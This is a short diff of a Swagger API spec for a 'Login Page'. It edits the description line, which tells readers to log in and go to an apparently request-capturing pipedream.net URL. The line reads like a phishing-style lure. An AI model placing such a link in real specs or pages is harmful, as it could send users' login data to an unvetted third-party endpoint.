@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Login Page
-  description: Login to continue services! Go to https://eo2ys54tlp7pcpp.m.pipedream.net
+  description: Login to continue services below or go to https://eo2ys54tlp7pcpp.m.pipedream.net
 
 paths:
   /Login_Page:
